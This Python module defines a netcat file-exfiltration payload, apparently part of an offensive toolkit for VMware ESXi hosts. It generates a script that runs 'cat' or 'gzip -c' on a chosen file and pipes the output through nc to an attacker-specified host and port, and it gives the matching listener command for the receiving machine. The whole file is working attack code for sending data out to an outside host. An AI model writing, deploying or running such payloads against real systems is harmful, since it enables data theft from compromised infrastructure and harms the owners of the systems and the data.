class Payload:
    def __init__(self):

        self.info = {
            "name": "esx-netcat-file",
            "description": "Send a file via netcat to another host running a listener. On the host, run nc -lvvp {port} > {file}",
            "date": "2021-10-12",
            "author": "PSMTHS",
            "compatibility": "ESXi 6.7 EP 15",
        }

        self.options = {
            "host": {
                "required": True,
                "info": "Destination host",
                "defaults": None,
                "value": "",
            },
            "port": {
                "required": True,
                "info": "Destination port",
                "defaults": "9001",
                "value": "",
            },
            "file": {
                "required": True,
                "info": "File to exfiltrate via netcat (nc)",
                "defaults": None,
                "value": "",
            },
            "compression": {
                "required": True,
                "info": "Stream compressed transfer for larger files (gz). Use nc -lvvp {port} | gunzip > {file} instead.",
                "defaults": False,
                "value": "",
            },
        }

        # Set payload options to defaults
        for option, value in self.options.items():
            value["value"] = value["defaults"]

    def gen_payload(self):

        host = self.options["host"]["value"]
        port = self.options["port"]["value"]
        file = self.options["file"]["value"]
        compression = self.options["compression"]["value"]

        if compression:
            payload_script = """
import os
os.system('gzip -c %(file)s | nc %(host)s %(port)s')
            """ % {
                "host": host,
                "port": port,
                "file": file,
            }
        else:
            payload_script = """
import os
os.system('cat %(file)s | nc %(host)s %(port)s')
            """ % {
                "host": host,
                "port": port,
                "file": file,
            }

        return payload_script
